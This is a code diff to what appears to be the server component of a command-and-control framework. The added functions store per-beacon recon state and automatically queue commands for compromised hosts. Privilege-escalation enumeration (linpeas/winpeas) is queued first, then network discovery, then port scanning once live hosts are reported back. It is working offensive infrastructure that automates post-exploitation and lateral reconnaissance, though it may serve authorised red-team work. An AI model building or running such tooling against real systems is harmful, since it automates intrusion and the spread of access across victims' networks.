@@ -1257,6 +1257,107 @@ def _beacon_records_path(client_id: str) -> str:
     return os.path.join(ALLOWED_DIRECTORY, "sessions", f"{sanitize_client_id(client_id)}{'.records.jsonl'}")
 
 
+_RECON_STATE_FILENAME = "recon_state.json"
+
+
+def _malleable_recon_state_dir(client_id: str) -> tuple[str, str]:
+    """Resolve the bounded recon-state directory and marker path.
+
+    Args:
+        client_id: Sanitised beacon identifier.
+
+    Returns:
+        ``(state_dir, marker_path)`` where ``state_dir`` is a
+        ``sessions/<safe_id>/c2`` subdirectory and ``marker_path`` points
+        to ``recon_state.json`` inside it.
+
+    Raises:
+        ValueError: If the sanitised client_id is empty or the resolved
+            marker path escapes the allowed directory.
+    """
+    from modules.beacon_history import sanitize_client_id
+
+    safe_id = sanitize_client_id(client_id)
+    if not safe_id:
+        raise ValueError(f"Invalid client_id after sanitization: {client_id}")
+    state_dir = os.path.join(ALLOWED_DIRECTORY, "sessions", safe_id, "c2")
+    marker = os.path.realpath(os.path.join(state_dir, _RECON_STATE_FILENAME))
+    allowed = os.path.realpath(ALLOWED_DIRECTORY)
+    if not marker.startswith(allowed + os.sep):
+        raise ValueError(f"Recon state path escapes allowed directory: {marker}")
+    return state_dir, marker
+
+
+def _load_malleable_recon_state(client_id: str) -> dict:
+    """Load the per-beacon malleable recon markers (discover/portscan).
+
+    Args:
+        client_id: Beacon identifier.
+
+    Returns:
+        The stored marker dict, or an empty dict when unavailable.
+    """
+    try:
+        _state_dir, marker = _malleable_recon_state_dir(client_id)
+        if os.path.isfile(marker):
+            with open(marker, encoding="utf-8") as handle:
+                data = json.load(handle)
+                if isinstance(data, dict):
+                    return data
+    except (OSError, json.JSONDecodeError, ValueError) as exc:
+        logging.debug("[beacon_recon] markers load failed: %s", exc)
+    return {}
+
+
+def _save_malleable_recon_state(client_id: str, state: dict) -> bool:
+    """Persist the per-beacon malleable recon markers.
+
+    Args:
+        client_id: Beacon identifier.
+        state: Marker dict (``discover_queued``, ``portscan_queued``).
+
+    Returns:
+        True when the marker file was written.
+    """
+    try:
+        state_dir, marker = _malleable_recon_state_dir(client_id)
+        os.makedirs(state_dir, exist_ok=True)
+        with open(marker, "w", encoding="utf-8") as handle:
+            json.dump(state, handle)
+        return True
+    except (OSError, ValueError) as exc:
+        logging.debug("[beacon_recon] markers save failed: %s", exc)
+        return False
+
+
+def _enqueue_malleable_command(client_id: str, command: str) -> bool:
+    """Append one command to a beacon queue file (crosses process boundary).
+
+    Args:
+        client_id: Beacon identifier.
+        command: Malleable command payload, e.g. ``"portscan:"``.
+
+    Returns:
+        True when the queue file was written.
+    """
+    try:
+        queue_path = _secure_command_queue_path(client_id)
+        os.makedirs(os.path.dirname(queue_path), exist_ok=True)
+        _cmds: list = []
+        if os.path.isfile(queue_path):
+            with open(queue_path, encoding="utf-8") as handle:
+                _cmds = json.load(handle)
+        if not isinstance(_cmds, list):
+            _cmds = []
+        _cmds.append(command)
+        with open(queue_path, "w", encoding="utf-8") as handle:
+            json.dump(_cmds, handle)
+        return True
+    except (OSError, json.JSONDecodeError, ValueError) as exc:
+        logging.debug("[beacon_recon] queue append failed: %s", exc)
+        return False
+
+
 def _append_beacon_record(record: dict) -> bool:
     """Append one beacon result record to the persistent JSONL history.
 
@@ -3676,21 +3777,31 @@ def receive_result(client_id):
                     try:
                         _platform = _normalise_platform(str(client))
                         _privesc_cmd = _build_privesc_command(_platform)
+                        _cmds = []
+                        _queue_path = _secure_command_queue_path(sanitized_client_id)
+                        if os.path.isfile(_queue_path):
+                            with open(_queue_path) as _qf:
+                                _cmds = json.load(_qf)
                         if _privesc_cmd:
-                            _queue_path = _secure_command_queue_path(sanitized_client_id)
-                            _cmds = []
-                            if os.path.isfile(_queue_path):
-                                with open(_queue_path) as _qf:
-                                    _cmds = json.load(_qf)
                             _cmds.append(_privesc_cmd)
-                            with open(_queue_path, "w") as _qf:
-                                json.dump(_cmds, _qf)
                             logging.info(
                                 "[privesc] Queued %s for %s: %.100s",
                                 "linpeas" if _platform == "linux" else "winpeas",
                                 sanitized_client_id,
                                 _privesc_cmd,
                             )
+                        _recon_state = _load_malleable_recon_state(sanitized_client_id)
+                        if not _recon_state.get("discover_queued"):
+                            _cmds.append("discover:")
+                            _recon_state["discover_queued"] = True
+                            logging.info(
+                                "[beacon_recon] Queued discover: for %s",
+                                sanitized_client_id,
+                            )
+                        _save_malleable_recon_state(sanitized_client_id, _recon_state)
+                        if _cmds:
+                            with open(_queue_path, "w") as _qf:
+                                json.dump(_cmds, _qf)
                     except Exception as _qe:
                         logging.debug("[privesc] Queue failed: %s", _qe)
 
@@ -3735,13 +3846,41 @@ def receive_result(client_id):
                     except Exception:
                         pass
 
-                if result_portscan:
-                    for _ps in str(result_portscan).split(","):
-                        try:
-                            _port = int(_ps.strip())
-                            _hook_engine.fire("service_detected", {"port": _port, "host": _primary_ip})
-                        except ValueError:
-                            pass
+                if result_portscan or discovered_ips:
+                    try:
+                        from modules.beacon_recon import ingest_beacon_recon as _ingest_recon
+
+                        _recon_stats = _ingest_recon(
+                            primary_ip=str(_primary_ip),
+                            discovered_ips=discovered_ips,
+                            portscan=result_portscan,
+                            hostname=str(hostname),
+                            user=str(user),
+                            client_id=str(sanitized_client_id),
+                        )
+                        logging.info(
+                            "[beacon_recon] %s: %s",
+                            sanitized_client_id,
+                            {key: _recon_stats.get(key) for key in ("hosts", "services")},
+                        )
+                        for _ps_host, _ps_ports in (_recon_stats.get("scanned") or {}).items():
+                            for _pp in _ps_ports:
+                                _hook_engine.fire(
+                                    "service_detected",
+                                    {"port": _pp, "host": _ps_host},
+                                )
+                        _recon_state = _load_malleable_recon_state(sanitized_client_id)
+                        if _recon_stats.get("discovered") and not _recon_state.get("portscan_queued"):
+                            _recon_state["portscan_queued"] = True
+                            _save_malleable_recon_state(sanitized_client_id, _recon_state)
+                            _enqueue_malleable_command(sanitized_client_id, "portscan:")
+                            logging.info(
+                                "[beacon_recon] Queued portscan: for %s (%d live host(s))",
+                                sanitized_client_id,
+                                len(_recon_stats.get("discovered") or []),
+                            )
+                    except Exception as _recon_exc:
+                        logging.debug("[beacon_recon] ingest failed: %s", _recon_exc)
             except Exception as _hook_exc:
                 logging.debug("[hooks] fire failed: %s", _hook_exc)
 
